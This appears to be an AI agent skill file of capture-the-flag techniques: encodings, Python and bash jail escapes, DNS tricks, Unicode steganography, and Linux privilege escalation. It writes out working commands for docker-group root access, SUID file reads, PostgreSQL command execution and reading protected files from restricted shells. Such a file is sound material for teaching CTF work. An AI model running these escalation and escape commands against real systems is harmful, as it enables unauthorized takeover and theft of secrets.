---
name: ctf-misc
description: Provides miscellaneous CTF challenge techniques for problems that do not cleanly fit the main categories. Use for encoding puzzles, pyjails, bash jails, RF/SDR, DNS oddities, unicode tricks, esoteric languages, QR or audio puzzles, constraint solving, game theory, unusual sandbox escapes, and hybrid logic puzzles. Prefer a more specific skill first when the challenge is mainly web, pwn, reverse, forensics, malware, OSINT, or crypto. Treat this as the fallback skill for genuine cross-category or edge-case challenges, not the default starting point.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
metadata:
  user-invocable: "false"
---

# CTF Miscellaneous

Quick reference for miscellaneous CTF challenges. Each technique has a one-liner here; see supporting files for full details.

## Prerequisites

**Python packages (all platforms):**
```bash
pip install z3-solver pwntools Pillow numpy requests dnslib
```

**Linux (apt):**
```bash
apt install ffmpeg qrencode
```

**macOS (Homebrew):**
```bash
brew install ffmpeg qrencode
```

**Manual install:**
- SageMath — Linux: `apt install sagemath`, macOS: `brew install --cask sage`

## Additional Resources

- [pyjails.md](pyjails.md) - Python jail/sandbox escape techniques, quine context detection, restricted character repunit decomposition, func_globals module chain traversal, restricted charset number generation, class attribute persistence
- [bashjails.md](bashjails.md) - Bash jail/restricted shell escape techniques, HISTFILE file read trick, bash -v verbose mode, ctypes.sh direct C library calls
- [encodings.md](encodings.md) - Encodings, QR codes, esolangs, UTF-16 tricks, BCD encoding, multi-layer auto-decoding, indexed directory QR reassembly, multi-stage URL encoding chains
- [encodings-advanced.md](encodings-advanced.md) - Verilog/HDL, Gray code cyclic encoding, RTF custom tag extraction, SMS PDU decoding, multi-encoding sequential solvers, UTF-9, pixel binary encoding, hexadecimal Sudoku + QR assembly, TOPKEK, MaxiCode
- [rf-sdr.md](rf-sdr.md) - RF/SDR/IQ signal processing (QAM-16, carrier recovery, timing sync)
- [dns.md](dns.md) - DNS exploitation (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling)
- [games-and-vms.md](games-and-vms.md) - WASM patching, Roblox place file reversing, PyInstaller, marshal analysis, Python env RCE, Z3 (including boolean logic gate network SAT solving), K8s RBAC, floating-point precision exploitation, custom assembly language sandbox escape via Python MRO chain
- [games-and-vms-2.md](games-and-vms-2.md) - Cookie checkpoint game brute-forcing, Flask cookie game state leakage, WebSocket game manipulation, server time-only validation bypass, De Bruijn sequence, Brainfuck instrumentation, WASM linear memory manipulation
- [games-and-vms-3.md](games-and-vms-3.md) - memfd_create packed binaries, multi-phase crypto games with HMAC commitment-reveal and GF(256) Nim, emulator ROM-switching state preservation, Python marshal code injection, Benford's Law bypass, parallel connection oracle relay, nonogram solver pipelines, 100 prisoners problem, C code jail escape via emoji identifiers, BuildKit daemon build secret exploitation, Docker container escape, Levenshtein distance oracle attack
- [linux-privesc.md](linux-privesc.md) - Sudo wildcard parameter injection (fnmatch), crafted pcap for sudoers.d, monit confcheck process injection, Apache -d override, backup cronjob SUID, PostgreSQL COPY TO PROGRAM RCE, PostgreSQL backup credential extraction, NFS share exploitation, SSH Unix socket tunneling, PaperCut Print Deploy privesc, Squid proxy pivoting, Zabbix admin password reset via MySQL, WinSSHTerm credential decryption

---

## When to Pivot

- If the puzzle is actually centered on cryptography or number theory, switch to `/ctf-crypto`.
- If the challenge is a real binary exploit instead of a jail, toy VM, or encoding problem, switch to `/ctf-pwn` or `/ctf-reverse`.
- If the input is mostly files, images, audio, or packet captures that need recovery work first, switch to `/ctf-forensics`.
- For ML/AI techniques (model attacks, adversarial examples, LLM jailbreaking), see `/ctf-ai-ml`.

## Quick Start Commands

```bash
# File identification
file mystery_file
xxd mystery_file | head -5
python3 -c "import magic; print(magic.from_file('mystery_file'))"

# Encoding detection
python3 -c "import base64; print(base64.b64decode('<data>'))"
echo '<data>' | base64 -d
echo '<hex>' | xxd -r -p

# QR code
zbarimg qr.png
python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('qr.png')))"

# Z3 constraint solving
python3 -c "from z3 import *; x=BitVec('x',32); s=Solver(); s.add(x^0xdead==0xbeef); s.check(); print(s.model())"

# Python jail test
python3 -c "__import__('os').system('id')"
```

## General Tips

- Read all provided files carefully
- Check file metadata, hidden content, encoding
- Power Automate scripts may hide API calls
- Use binary search when guessing multiple answers

## Common Encodings

```bash
# Base64
echo "encoded" | base64 -d

# Base32 (A-Z2-7=)
echo "OBUWG32D..." | base32 -d

# Hex
echo "68656c6c6f" | xxd -r -p

# ROT13
echo "uryyb" | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

**Identify by charset:**
- Base64: `A-Za-z0-9+/=`
- Base32: `A-Z2-7=` (no lowercase)
- Hex: `0-9a-fA-F`

See [encodings.md](encodings.md) for Caesar brute force, URL encoding, and full details.

## IEEE-754 Float Encoding (Data Hiding)

**Pattern (Floating):** Numbers are float32 values hiding raw bytes.

**Key insight:** A 32-bit float is just 4 bytes interpreted as a number. Reinterpret as raw bytes -> ASCII.

```python
import struct
floats = [1.234e5, -3.456e-7, ...]  # Whatever the challenge gives
flag = b''
for f in floats:
    flag += struct.pack('>f', f)
print(flag.decode())
```

**Variations:** Double `'>d'`, little-endian `'<f'`, mixed. See [encodings.md](encodings.md) for CyberChef recipe.

## USB Mouse PCAP Reconstruction

**Pattern (Hunt and Peck):** USB HID mouse traffic captures on-screen keyboard typing. Use USB-Mouse-Pcap-Visualizer, extract click coordinates (falling edges), cumsum relative deltas for absolute positions, overlay on OSK image.

## File Type Detection

```bash
file unknown_file
xxd unknown_file | head
binwalk unknown_file
```

## Archive Extraction

```bash
7z x archive.7z           # Universal
tar -xzf archive.tar.gz   # Gzip
tar -xjf archive.tar.bz2  # Bzip2
tar -xJf archive.tar.xz   # XZ
```

### Nested Archive Script
```bash
while f=$(ls *.tar* *.gz *.bz2 *.xz *.zip *.7z 2>/dev/null|head -1) && [ -n "$f" ]; do
    7z x -y "$f" && rm "$f"
done
```

## QR Codes

```bash
zbarimg qrcode.png       # Decode
qrencode -o out.png "data"
```

**MaxiCode barcode:** Hexagonal 2D barcode with bullseye center; decode with `zxing` (Java) since standard QR decoders fail. See [encodings-advanced.md](encodings-advanced.md#maxicode-2d-barcode-decoding-csaw-ctf-2016).

**TOPKEK encoding:** CTF-specific binary encoding where `KEK=0`, `TOP=1`, `!` suffix = repeat count. See [encodings-advanced.md](encodings-advanced.md#topkek-binary-encoding-hack-the-vote-2016).

See [encodings.md](encodings.md) for QR structure, repair techniques, chunk reassembly (structural and indexed-directory variants), and multi-stage URL encoding chains.

## Audio Challenges

```bash
sox audio.wav -n spectrogram  # Visual data
qsstv                          # SSTV decoder
```

## RF / SDR / IQ Signal Processing

See [rf-sdr.md](rf-sdr.md) for full details (IQ formats, QAM-16 demod, carrier/timing recovery).

**Quick reference:**
- **cf32**: `np.fromfile(path, dtype=np.complex64)` | **cs16**: int16 reshape(-1,2) | **cu8**: RTL-SDR raw
- Circles in constellation = constant frequency offset; Spirals = drifting frequency + gain instability
- 4-fold ambiguity in DD carrier recovery - try 0/90/180/270 rotation

## pwntools Interaction

```python
from pwn import *

r = remote('host', port)
r.recvuntil(b'prompt: ')
r.sendline(b'answer')
r.interactive()
```

## Python Jail Quick Reference

- **Oracle pattern:** `L()` = length, `Q(i,x)` = compare, `S(guess)` = submit. Linear or binary search.
- **Walrus bypass:** `(abcdef := "new_chars")` reassigns constraint vars
- **Decorator bypass:** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__` for no-call, no-quotes escape
- **String join:** `open(''.join(['fl','ag.txt'])).read()` when `+` is blocked

See [pyjails.md](pyjails.md) for full techniques.

## Z3 / Constraint Solving

```python
from z3 import *
flag = [BitVec(f'f{i}', 8) for i in range(FLAG_LEN)]
s = Solver()
# Add constraints, check sat, extract model
```

See [games-and-vms.md](games-and-vms.md) for YARA rules, type systems as constraints, boolean logic gate network SAT solving.

## Hash Identification

MD5: `0x67452301` | SHA-256: `0x6a09e667` | MurmurHash64A: `0xC6A4A7935BD1E995`

## SHA-256 Length Extension Attack

MAC = `SHA-256(SECRET || msg)` with known msg/hash -> forge valid MAC via `hlextend`. Vulnerable: SHA-256, MD5, SHA-1. NOT: HMAC, SHA-3.

```python
import hlextend
sha = hlextend.new('sha256')
new_data = sha.extend(b'extension', b'original_message', len_secret, known_hash_hex)
```

## Technique Quick References

- **PyInstaller:** `pyinstxtractor.py packed.exe`. See [games-and-vms.md](games-and-vms.md) for opcode remapping.
- **Marshal:** `marshal.load(f)` then `dis.dis(code)`. See [games-and-vms.md](games-and-vms.md).
- **Python env RCE:** `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER="cmd"`. See [games-and-vms.md](games-and-vms.md).
- **WASM patching:** `wasm2wat` -> flip minimax -> `wat2wasm`. See [games-and-vms.md](games-and-vms.md).
- **Float precision:** Large multipliers amplify FP errors into exploitable fractions. See [games-and-vms.md](games-and-vms.md).
- **K8s RBAC bypass:** SA token -> impersonate -> hostPath mount -> read secrets. See [games-and-vms.md](games-and-vms.md).
- **Cookie checkpoint:** Save session cookies before guesses, restore on failure to brute-force without reset. See [games-and-vms-2.md](games-and-vms-2.md).
- **Flask cookie game state:** `flask-unsign -d -c '<cookie>'` decodes unsigned Flask sessions, leaking game answers. See [games-and-vms-2.md](games-and-vms-2.md).
- **WebSocket teleport:** Modify `player.x`/`player.y` in console, call verification function. See [games-and-vms-2.md](games-and-vms-2.md).
- **Time-only validation:** Start session, `time.sleep(required_seconds)`, submit win. See [games-and-vms-2.md](games-and-vms-2.md).
- **Quine context detection:** Dual-purpose quine that prints itself (passes validation) and runs payload only in server process via globals gate. See [pyjails.md](pyjails.md).
- **Repunit decomposition:** Decompose target integer into sum of repunits (1, 11, 111, ...) using only 2 characters (`1` and `+`) for restricted eval. See [pyjails.md](pyjails.md).
- **De Bruijn sequence:** B(k, n) contains all k^n possible n-length strings as substrings; linearize by appending first n-1 chars. See [games-and-vms-2.md](games-and-vms-2.md).
- **Brainfuck instrumentation:** Instrument BF interpreter to track tape cells, brute-force flag character-by-character via validation cell. See [games-and-vms-2.md](games-and-vms-2.md).
- **WASM memory manipulation:** Patch WASM linear memory at runtime to set game state variables directly, bypassing game logic. See [games-and-vms-2.md](games-and-vms-2.md).
- **Lua sandbox escape:** Bypass `load()`/`os.execute()` filters via `os["execute"]` table indexing or `loadstring` alias. See [games-and-vms.md](games-and-vms.md#lua-sandbox-escape-via-function-name-injection-csaw-ctf-2016).
- **C code jail via emoji + gadget embedding:** When only emoji and punctuation are allowed in C, use `(😃==😃)` as constant 1, build integers, embed gadgets in `add eax, imm32` constants, jump to offset+1 for shellcode primitives. See [games-and-vms-3.md](games-and-vms-3.md#c-code-jail-escape-via-emoji-identifiers-and-gadget-embedding-midnight-flag-2026).
- **Emulator ROM-switching:** `/load` replaces ROM but preserves CPU state (registers, RAM, PC). Switch ROMs at specific PCs to combine INIT from one ROM with display instructions from another → read protected memory. See [games-and-vms-3.md](games-and-vms-3.md#emulator-rom-switching-state-preservation-bsidessf-2026).
- **BuildKit daemon exploitation:** Exposed BuildKit gRPC allows nested `buildctl build` with `--mount=type=secret` to read build secrets. Two-stage Dockerfile: install buildctl → submit nested build mounting flag secret. See [games-and-vms-3.md](games-and-vms-3.md#buildkit-daemon-exploitation-for-build-secrets-bsidessf-2026).
- **Docker container escape:** Privileged breakout via host device mount, docker.sock socket escape, CAP_SYS_ADMIN cgroup release_agent, container info leakage via /proc and overlayfs. See [games-and-vms-3.md](games-and-vms-3.md#docker-container-escape-techniques).
- **Hexadecimal Sudoku + QR assembly:** 4 QR codes encode 16x16 hex Sudoku quadrants; solve grid, read diagonal as hex pairs → ASCII flag. See [encodings-advanced.md](encodings-advanced.md#hexadecimal-sudoku-qr-assembly-bsidessf-2026).
- **Z3 boolean gate network SAT solving:** Product key validation as 250 boolean gates (AND/OR/XOR/NOT) over 125 input bits. Model each gate as Z3 constraint, require all outputs True, solve in milliseconds. See [games-and-vms.md](games-and-vms.md#z3-sat-solving-for-boolean-logic-gate-networks-bsidessf-2026).

## 3D Printer Video Nozzle Tracking (LACTF 2026)

**Pattern (flag-irl):** Video of 3D printer fabricating nameplate. Flag is the printed text.

**Technique:** Track nozzle X/Y positions from video frames, filter for print moves (top/text layer only), plot 2D histogram to reveal letter shapes:
```python
# 1. Identify text layer frames (e.g., frames 26100-28350)
# 2. Track print head X position (physical X-axis)
# 3. Track bed X position (physical Y-axis from camera angle)
# 4. Filter for moves with extrusion (head moving while printing)
# 5. Plot as 2D scatter/histogram -> letters appear
```

## Discord API Enumeration (0xFun 2026)

Flags hidden in Discord metadata (roles, animated emoji, embeds). Invoke `/ctf-osint` for Discord API enumeration technique and code (see social-media.md in ctf-osint).

---

## SUID Binary Exploitation (0xFun 2026)

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Cross-reference with GTFObins
# xxd with SUID: xxd flag.txt | xxd -r
# vim with SUID: vim -c ':!cat /flag.txt'
```

**Reference:** https://gtfobins.github.io/

---

## Linux Privilege Escalation Quick Checks

```bash
# GECOS field passwords
cat /etc/passwd  # Check 5th colon-separated field

# ACL permissions
getfacl /path/to/restricted/file

# Sudo permissions
sudo -l

# Docker group membership (instant root)
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

## Docker Group Privilege Escalation (H7CTF 2025)

User in the `docker` group can mount the host filesystem into a container and chroot into it for root access.

```bash
# Check group membership
id  # Look for "docker" in groups

# Mount host root filesystem and chroot
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh

# Now running as root on the host filesystem
cat /root/flag.txt
```

**Key insight:** Docker group membership is equivalent to root access. The `docker` CLI socket (`/var/run/docker.sock`) allows creating privileged containers that mount the entire host filesystem.

**Reference:** https://gtfobins.github.io/gtfobins/docker/

## Sudo Wildcard Parameter Injection (Dump HTB)

Sudo's `fnmatch()` matches `*` across argument boundaries. Inject extra flags (`-Z root`, `-r`, second `-w`) into locked-down commands. Craft pcap with embedded valid sudoers entries — sudo's parser recovers from binary junk, unlike cron's strict parser. See [linux-privesc.md](linux-privesc.md#sudo-wildcard-parameter-injection-via-fnmatch-dump-htb).

## Monit Process Command-Line Injection (Zero HTB)

Root monit script uses `pgrep -lfa` to extract process command lines, then executes a modified version. Create fake process via `perl -e '$0 = "..."'` with injected flags. Apache `-d` last-wins overrides ServerRoot; `-E` captures error output. `Include /root/flag` causes a parse error that reveals the file content. See [linux-privesc.md](linux-privesc.md#monit-confcheck-process-command-line-injection-zero-htb).

## PostgreSQL RCE and File Read (Slonik HTB)

`COPY (SELECT '') TO PROGRAM 'cmd'` executes OS commands as postgres. `pg_read_file('/path')` reads files. Extract credentials from `pg_basebackup` archives (`global/1260` = `pg_authid`). SSH tunnel to Unix sockets: `ssh -fNL 25432:/var/run/postgresql/.s.PGSQL.5432`. See [linux-privesc.md](linux-privesc.md#postgresql-copy-to-program-rce-slonik-htb).

## Backup Cronjob SUID Abuse (Slonik HTB)

Root cronjob copying directories preserves SUID bit but changes ownership to root. Place SUID bash in source directory → backup copies it as root-owned SUID. Execute with `bash -p`. See [linux-privesc.md](linux-privesc.md#backup-cronjob-suid-abuse-slonik-htb).

## PaperCut Print Deploy Privesc (Bamboo HTB)

Root process runs scripts from user-owned directory. Modify `server-command`, trigger via Mobility Print API refresh. See [linux-privesc.md](linux-privesc.md#papercut-print-deploy-privilege-escalation-bamboo-htb).

---

## Useful One-Liners

```bash
grep -rn "flag{" .
strings file | grep -i flag
python3 -c "print(int('deadbeef', 16))"
```

## Keyboard Shift Cipher

**Pattern (Frenzy):** Characters shifted left/right on QWERTY keyboard layout.

**Identification:** dCode Cipher Identifier suggests "Keyboard Shift Cipher"

**Decoding:** Use [dCode Keyboard Shift Cipher](https://www.dcode.fr/keyboard-shift-cipher) with automatic mode.

## Pigpen / Masonic Cipher

**Pattern (Working For Peanuts):** Geometric symbols representing letters based on grid positions.

**Identification:** Angular/geometric symbols, challenge references "Peanuts" comic (Charlie Brown), "dusty looking crypto"

**Decoding:** Map symbols to Pigpen grid positions, or use online decoder.

## ASCII in Numeric Data Columns

**Pattern (Cooked Books):** CSV/spreadsheet numeric values (48-126) are ASCII character codes.

```python
import csv
with open('data.csv') as f:
    reader = csv.DictReader(f)
    flag = ''.join(chr(int(row['Times Borrowed'])) for row in reader)
print(flag)
```

**CyberChef:** "From Decimal" recipe with line feed delimiter.

## Backdoor Detection in Source Code

**Pattern (Rear Hatch):** Hidden command prefix triggers `system()` call.

**Common patterns:**
- `strncmp(input, "exec:", 5)` -> runs `system(input + 5)`
- Hex-encoded comparison strings: `\x65\x78\x65\x63\x3a` = "exec:"
- Hidden conditions in maintenance/admin functions

## DNS Exploitation Techniques

See [dns.md](dns.md) for full details (ECS spoofing, NSEC walking, IXFR, rebinding, tunneling).

**Quick reference:**
- **ECS spoofing**: `dig @server flag.example.com TXT +subnet=10.13.37.1/24` - try leet-speak IPs (1337)
- **NSEC walking**: Follow NSEC chain to enumerate DNSSEC zones
- **IXFR**: `dig @server domain IXFR=0` when AXFR is blocked
- **DNS rebinding**: Low-TTL alternating resolution to bypass same-origin
- **DNS tunneling**: Data exfiltrated via subdomain queries or TXT responses

## Unicode Steganography

### Variation Selectors Supplement (U+E0100-U+E01EF)
**Patterns (Seen & emoji, Nullcon 2026):** Invisible Variation Selector Supplement characters encode ASCII via codepoint offset.

```python
# Extract hidden data from variation selectors after visible character
data = open('README.md', 'r').read().strip()
hidden = data[1:]  # Skip visible emoji character
flag = ''.join(chr((ord(c) - 0xE0100) + 16) for c in hidden)
```

**Detection:** Characters appear invisible but have non-zero length. Check with `[hex(ord(c)) for c in text]` -- look for codepoints in `0xE0100-0xE01EF` or `0xFE00-0xFE0F` range.

### Unicode Tags Block (U+E0000-U+E007F) (UTCTF 2026)

**Pattern (Hidden in Plain Sight):** Invisible Unicode Tag characters embedded in URLs, filenames, or text. Each tag codepoint maps directly to an ASCII character by subtracting `0xE0000`. URL-encoded as 4-byte UTF-8 sequences (`%F3%A0%81%...`).

```python
import urllib.parse

url = "https://example.com/page#Title%20%F3%A0%81%B5%F3%A0%81%B4...Visible%20Text"
decoded = urllib.parse.unquote(urllib.parse.urlparse(url).fragment)

flag = ''.join(
    chr(ord(ch) - 0xE0000)
    for ch in decoded
    if 0xE0000 <= ord(ch) <= 0xE007F
)
print(flag)
```

**Key insight:** Unicode Tags (U+E0001-U+E007F) mirror ASCII 1:1 — subtract `0xE0000` to recover the original character. They render as zero-width invisible glyphs in most fonts. Unlike Variation Selectors (U+E0100+), these have a simpler offset calculation and appear in URL fragments, challenge titles, or filenames where the text looks normal but has suspiciously long byte length.

**Detection:** Text or URL is longer than expected in bytes. Percent-encoded sequences starting with `%F3%A0%80` or `%F3%A0%81`. Python: `any(0xE0000 <= ord(c) <= 0xE007F for c in text)`.

## UTF-16 Endianness Reversal

**Pattern (endians):** Text "turned to Japanese" -- mojibake from UTF-16 endianness mismatch.

```python
# If encoded as UTF-16-LE but decoded as UTF-16-BE:
fixed = mojibake.encode('utf-16-be').decode('utf-16-le')
```

**Identification:** CJK characters, challenge mentions "translation" or "endian". See [encodings.md](encodings.md) for details.

## Cipher Identification Workflow

1. **ROT13** - Challenge mentions "ROT", text looks like garbled English
2. **Base64** - `A-Za-z0-9+/=`, title hints "64"
3. **Base32** - `A-Z2-7=` uppercase only
4. **Atbash** - Title hints (Abash/Atbash), preserves spaces, 1:1 substitution
5. **Pigpen** - Geometric symbols on grid
6. **Keyboard Shift** - Text looks like adjacent keys pressed
7. **Substitution** - Frequency analysis applicable

**Auto-identify:** [dCode Cipher Identifier](https://www.dcode.fr/cipher-identifier)

## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)

Read files without cat/less/head: `HISTFILE=/flag /bin/bash && history`, or `bash -v flag.txt` (verbose mode prints lines), or `ctypes.sh` `dlcall` for direct C library calls. See [bashjails.md](bashjails.md#histfile-trick-for-restricted-shell-file-reads-bctf-2016).

## Levenshtein Distance Oracle Attack (SunshineCTF 2016)

Oracle returns edit distance between guess and secret. Determine length from empty string, identify present chars from single-char repeats, binary search for positions. O(n log n) queries. See [games-and-vms-3.md](games-and-vms-3.md#levenshtein-distance-oracle-attack-sunshinectf-2016).

## SECCOMP High-Bit File Descriptor Bypass (33C3 CTF 2016)

`close(0x8000000000000002)` passes 64-bit SECCOMP check (≠ 2) but kernel truncates to 32-bit (== 2), closing fd 2. Next `open()` returns fd 2 for arbitrary file. Type-width mismatch between BPF filter and kernel. See [games-and-vms-3.md](games-and-vms-3.md#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016).

## rvim Jail Escape via Python3 (BKP 2017)

`rvim` blocks `:!` but `:python3 import os; os.system("cmd")` executes arbitrary commands. Check `:version` for `+python3`/`+lua`/`+ruby`. See [games-and-vms-3.md](games-and-vms-3.md#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017).


---


# bashjails

# CTF Misc - Bash Jails & Restricted Shells

## Table of Contents
- [Identifying the Jail](#identifying-the-jail)
- [Eval Context Detection](#eval-context-detection)
- [Character-Restricted Bash: Only #, $, \](#character-restricted-bash-only---)
- [Internal Service Discovery (Post-Shell)](#internal-service-discovery-post-shell)
- [Other Restricted Character Set Tricks](#other-restricted-character-set-tricks)
  - [Building numbers from $# and ${##}](#building-numbers-from--and-)
  - [Using PID digits](#using-pid-digits)
  - [Octal in ANSI-C quoting](#octal-in-ansi-c-quoting)
  - [Dollar-zero variants](#dollar-zero-variants)
- [Privilege Escalation Checklist (Post-Shell)](#privilege-escalation-checklist-post-shell)
- [HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)](#histfile-trick-for-restricted-shell-file-reads-bctf-2016)
- [References](#references)

---

## Identifying the Jail

**Methodology:** Send test inputs and observe error messages to determine:
1. What characters are allowed (whitelist vs blacklist)
2. Whether input is `eval`'d, passed to `bash -c`, or something else
3. Whether input is wrapped in quotes (double-quoted eval context)

**Test for character filtering:**
```python
from pwn import *
import time

# Send each char combined with a known-good payload
for c in range(32, 127):
    r = remote(host, port, level='error')
    r.sendline(b'$#' + bytes([c]) + b'$#')
    time.sleep(0.3)
    try:
        data = r.recv(timeout=1)
        if data:
            print(f'{chr(c)!r}: {data.decode().strip()[:60]}')
    except:
        pass
    r.close()
```

**Silent rejection = character not allowed.** Error output = character passed the filter.

**Key insight:** Systematically probe each printable character to map the allowed set before crafting payloads. Silent rejection means the character is filtered; any error output means it passed the filter and reached the shell.

---

## Eval Context Detection

**Double-quoted eval** (`eval "$input"`):
- Trailing `\` causes: `unexpected EOF while looking for matching '"'`
- `$#` expands to `0` (inside double-quotes, `$` still expands)
- `\$` gives literal `$` (backslash escapes dollar in double-quotes)
- `\#` gives `\#` literally (backslash doesn't escape `#` in double-quotes, but eval then interprets `\#` as literal `#`)

**Bare eval** (`eval $input`):
- Word splitting applies
- Backslash escapes work differently

**Read behavior:**
- `read -r`: backslashes preserved literally
- `read` (without -r): backslash is escape character (strips backslashes)

**Key insight:** Distinguish between `eval "$input"` (double-quoted) and `eval $input` (bare) by sending a trailing backslash. Double-quoted eval produces an "unexpected EOF" error because the backslash escapes the closing quote; bare eval does not. This determines which escape sequences are available for exploitation.

---

## Character-Restricted Bash: Only `#`, `$`, `\`

**Pattern (HashCashSlash):** Filter regex `^[\\#\$]+$` allows only hash, dollar, backslash.

**Available expansions:**
| Construct | Result | Notes |
|-----------|--------|-------|
| `$#` | `0` | Number of positional parameters |
| `$$` | PID | Current process ID (multi-digit number) |
| `\$` | literal `$` | In double-quoted eval context |
| `\\` | literal `\` | In double-quoted eval context |
| `\#` | literal `#` | Via eval's second-pass interpretation |

**Key payload: `\$$#`**

In a double-quoted eval context like `bash -c "\"${x}\""`:
- `\$` → literal `$` (backslash escapes dollar in double-quotes)
- `$#` → `0` (parameter expansion)
- Combined: `$0` in the eval context
- `$0` = the shell name = `bash`
- Result: **spawns an interactive bash shell**

**Why it works:** The script wraps input in double quotes for `bash -c`, so `\$` becomes a literal `$`, then `$#` expands to `0`, giving the string `$0`. When eval executes this, `$0` expands to the shell invocation name (`bash`), spawning a new shell.

---

## Internal Service Discovery (Post-Shell)

After escaping the jail, the flag may not be directly readable. Check for internal services:

```bash
# Find all running processes and their command lines
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' '

# Look specifically for flag-serving processes
for pid in /proc/[0-9]*/; do
    cmd=$(cat ${pid}cmdline 2>/dev/null | tr '\0' ' ')
    if echo "$cmd" | grep -qi flag; then
        echo "PID $(basename $pid): $cmd"
        cat ${pid}status 2>/dev/null | grep -E "^(Uid|Name):"
    fi
done
```

**Common patterns:**
- `socat TCP-LISTEN:PORT,bind=127.0.0.1 EXEC:cat /flag` → flag on localhost port
- `readflag` binary with SUID bit
- Flag in environment of root process

**Connect to internal services:**
```bash
# Bash built-in TCP (no netcat needed)
cat < /dev/tcp/127.0.0.1/PORT

# Or with netcat if available
nc 127.0.0.1 PORT
```

**Key insight:** After escaping the jail, check `/proc/*/cmdline` for internal services serving the flag on localhost. The flag is often on a different process, not readable from the filesystem directly.

---

## Other Restricted Character Set Tricks

### Building numbers from `$#` and `${##}`
If `{` and `}` are allowed:
- `$#` = 0
- `${##}` = 1 (length of `$#`'s string value "0")
- Concatenate to build binary: `${##}$#${##}` = "101"

### Using PID digits
`$$` gives a multi-digit number. If you can extract individual digits (requires `{}` and `:`):
```bash
${$$:0:1}  # First digit of PID
${$$:1:1}  # Second digit of PID
```

### Octal in ANSI-C quoting
If `'` is available: `$'\101'` = `A`, `$'\142\141\163\150'` = `bash`

### Dollar-zero variants
| Shell | `$0` value |
|-------|-----------|
| bash script | script path |
| bash -c | `bash` |
| interactive | `bash` or `-bash` |
| sh | `sh` |

**Key insight:** Build arbitrary strings from minimal character sets by combining `$#` (yields 0), `${##}` (yields 1), `$$` (PID digits), and ANSI-C quoting (`$'\NNN'` for octal). Even a 3-character alphabet (`#$\`) is sufficient to spawn a shell via `$0` expansion.

---

## Privilege Escalation Checklist (Post-Shell)

1. **SUID binaries:** `find / -perm -4000 2>/dev/null`
2. **Capabilities:** `find / -executable -type f -exec getcap {} \; 2>/dev/null`
3. **Internal services:** Check `/proc/*/cmdline` for flag-serving daemons
4. **Process UIDs:** `cat /proc/*/status 2>/dev/null | grep -A5 "^Name:.*flag"`
5. **Writable paths:** Check if PATH contains writable dirs
6. **Docker/container:** `/dev/tcp` for internal service access, `/.dockerenv` presence

**Key insight:** After escaping the jail, run through this checklist in order: SUID binaries and capabilities first (quickest wins), then internal services via `/proc/*/cmdline`, then writable PATH directories. In containers, use `/dev/tcp` for internal service access since netcat is rarely available.

---

## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)

Read arbitrary files in restricted bash shells without cat/less/head:

```bash
# Method 1: HISTFILE loading
HISTFILE=/path/to/flag /bin/bash
history  # Flag contents loaded as command history

# Method 2: bash verbose mode
bash -v flag.txt  # Prints each line before executing; comments (#flag{...}) print without error

# Method 3: ctypes.sh direct C library calls
dlcall -n fd open /flag 0
dlcall -n m mmap 0 100 1 1 $fd 0
dlcall printf %s $m
```

**Key insight:** Three ways to read files without standard utilities: (1) HISTFILE loading, (2) `bash -v` verbose mode, (3) `ctypes.sh` direct C library calls via `dlcall`.

---

## References

- 0xL4ugh CTF "HashCashSlash": Filter `^[\\#\$]+$`, payload `\$$#`, internal socat flag service


# dns

# CTF Misc - DNS Exploitation Techniques

## Table of Contents
- [EDNS Client Subnet (ECS) Spoofing](#edns-client-subnet-ecs-spoofing)
- [DNSSEC NSEC Walking](#dnssec-nsec-walking)
- [Incremental Zone Transfer (IXFR)](#incremental-zone-transfer-ixfr)
- [DNS Rebinding](#dns-rebinding)
- [DNS Tunneling / Exfiltration](#dns-tunneling--exfiltration)
- [DNS Enumeration Quick Reference](#dns-enumeration-quick-reference)
- [DNS Round-Robin A Record Enumeration (EKOPARTY 2017)](#dns-round-robin-a-record-enumeration-ekoparty-2017)

---

## EDNS Client Subnet (ECS) Spoofing
**Pattern (DragoNflieS, Nullcon 2026):** DNS server returns different records based on client IP. Spoof source using ECS option.

```bash
# dig with ECS option
dig @52.59.124.14 -p 5053 flag.example.com TXT +subnet=10.13.37.1/24
```

```python
import dns.edns, dns.query, dns.message

q = dns.message.make_query("flag.example.com", "TXT", use_edns=True)
ecs = dns.edns.ECSOption("10.13.37.1", 24, 0)  # Internal network subnet
q.use_edns(0, 0, 8192, options=[ecs])
r = dns.query.udp(q, "target_ip", port=5053, timeout=1.5)
for rrset in r.answer:
    for rd in rrset:
        print(b"".join(rd.strings).decode())
```

**Key insight:** Try leet-speak subnets like `10.13.37.0/24` (1337), common internal ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`).

## DNSSEC NSEC Walking
**Pattern (DiNoS, Nullcon 2026):** NSEC records in DNSSEC zones reveal all domain names by chaining to the next name.

```python
import subprocess, re

def walk_nsec(server, port, base_domain):
    """Walk NSEC chain to enumerate entire zone."""
    current = base_domain
    visited = set()
    records = []
    while current not in visited:
        visited.add(current)
        out = subprocess.check_output(
            ["dig", f"@{server}", "-p", str(port), "ANY", current, "+dnssec"],
            text=True)
        # Extract TXT records
        for m in re.finditer(r'TXT\s+"([^"]*)"', out):
            records.append((current, m.group(1)))
        # Follow NSEC chain
        m = re.search(r'NSEC\s+(\S+)', out)
        if m:
            current = m.group(1).rstrip('.')
        else:
            break
    return records
```

## Incremental Zone Transfer (IXFR)
**Pattern (Zoney, Nullcon 2026):** When AXFR is blocked, IXFR from old serial reveals zone update history including deleted records.

```bash
# AXFR blocked? Try IXFR from serial 0
dig @server -p 5054 flag.example.com IXFR=0
# Look for historical TXT records in the diff output
```

